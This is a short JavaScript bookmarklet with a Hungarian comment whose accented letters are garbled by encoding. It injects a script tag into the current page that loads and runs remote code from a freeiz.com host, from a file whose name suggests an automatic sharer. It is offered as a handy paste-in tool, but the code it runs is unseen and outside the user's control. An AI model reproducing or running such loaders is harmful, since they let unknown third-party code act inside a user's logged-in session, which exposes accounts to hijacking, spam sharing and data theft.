javascript:
/*Add meg az URL-t, �s beleteszi, ak�r Firefox-ba is!*/
url = 'http://cncdani2.freeiz.com/script/Erosites_automegoszto.js';
scr = $('<script type="text/javascript" />').attr('src', url);
$(document).append(scr);void(0);